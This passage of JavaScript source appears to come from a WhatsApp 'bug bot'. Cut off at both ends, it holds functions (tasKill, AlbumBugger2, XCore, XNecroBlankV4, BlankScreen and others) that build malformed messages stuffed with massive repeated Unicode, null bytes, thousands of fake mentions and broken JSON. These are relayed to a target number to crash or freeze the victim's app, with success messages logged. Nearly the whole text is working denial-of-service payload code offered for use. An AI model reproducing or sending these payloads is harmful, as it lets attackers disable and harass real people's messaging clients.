⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(200) + "ោ៝".repeat(200)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "SaturnX_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }, 
                    contextInfo: {
  isForwarded: true,
  forwardingScore: 9999,
  mentionedJid: mention ? [target, '0@s.whatsapp.net'] : [],
  quotedMessage: {
    conversation: "💀 SaturnX Nested Message " + "𑇂𑆵𑆴𑆿".repeat(50)
  },
  externalAdReply: {
    title: "SaturnX Killer 💥",
    body: "Bug injected ⚡",
    thumbnailUrl: qwerty,
    sourceUrl: "https://whatsapp.com",
    mediaType: 1,
    renderLargerThumbnail: true
  }
}
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await skid.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function tasKill(target, Ptcp = true) {
  try {
    await skid.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "#SaturnXappsNiBos\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "lemerKyxzan1st",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function interative(skid, target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: "\u0003".repeat(200000) },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 1000000)}@s.whatsapp.net`)
        ]
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          payment_currency: "payment_methods",
          payment_amount: 0
        })
      }
    }
  }, { userJid: target })

  await skid.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  })
}

// 2.
async function sletterZyrooX(skid, target) {
  try {
    const message = {
      botZyrooXMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "SaturnXnih" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          { name: "call_permission_request", buttonParamsJson: "{}" },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            }
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 1000000)}@s.whatsapp.net`)
        ],
        groupMentions: [
          { groupJid: "0@s.whatsapp.net", groupSubject: "ZyrooX" }
        ]
      }
    }
    await skid.relayMessage(target, message, {
      userJid: target,
      participant: { jid: target }
    })
  } catch (err) {
    console.error("Error sending Bug:", err)
  }
}
async function AlbumBugger2(skid, target)  {
   const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0, //trigger
      }
   }, {});
   
   const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter", 
            newsletterName: "SaturnXapps", 
            contentType: "UPDATE_CARD", 
            accessibilityText: "\u0000".repeat(9000), 
            serverMessageId: 18888888
          }, 
          mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
        annotations: [
          {
            polygonVertices: [
              {
                x: 0.05515563115477562,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.5867812633514404
              },
              {
                x: 0.05515563115477562,
                y: 0.5867812633514404
              }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "SaturnXapps",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(1000) 
            }
          }
        ]
     }
   };
   
   const messages = [];
   for (let i = 0; i < 10; i++) {

      const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }

   await skid.relayMessage("status@broadcast", album.message, {
      messageId: album.key.id,
      statusJidList: [target]
   });
   
   for (const msg of messages) {
      await skid.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
         statusJidList: [target]
      });
   }
}

async function XCore(skid, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "⭑̤⟅̊༑ ▾ 𝗠𝗘𝗠𝗘𝗞𝗦𝗔𝗧𝗨𝗥𝗡 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨 ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  })

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}

const VaxzyFcApi = JSON.stringify({
  status: true,
  criador: "XProtexGlow",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function XProtexImgXApi(skid, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
            hasMediaAttachment: true,
            body: {
              text: "Hi!!" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: VaxzyFcApi + "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: VaxzyFcApi + "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

    await skid.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    console.log(chalk.red(`Succes Sending Bug ImgXApi To ${target}`));
}
async function XNecroBlankV4(skid, target) {
  const msg1 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "SaturnX" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                },
              },
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(50000),
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Xtravs-ai.example.com",
                showAdAttribution: false
              },
            },
            body: { 
              text: "𒑡𝐒𝐚𝐭𝐮𝐫𝐧𝐗𝐰𝐞𝐝𝐞𝐝𝐞𝐝៚" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000),
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                ...Array.from(
               { length: 1900 },
               () =>
             "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
               },
             },
             externalAdReply: {
               title: "☀️",
               body: "🩸",
               mediaType: 1,
               renderLargerThumbnail: false,
             },
           },
           body: {
             text: "𒑡𝙎𝙖𝙩𝙪𝙧𝙣𝙓𝙩𝙯𝙮៚" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000),
           },
           nativeFlowMessage: {
             messageParamJson: "{".repeat(25000),
           },
           stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: false,
             stickerSentTs: "X",
             isAvatar: false,
             isAiSticker: false,
             isLottie: false,
           },
         },
       },
     },
   },
   {}
  );
  
  await skid.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  
  await skid.relayMessage(target, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: target },
  });
}
async function BlankScreen(skid, target) {
const text = "ྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱཱཱཱཱཱཱྀིཻཻིིིུུུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུ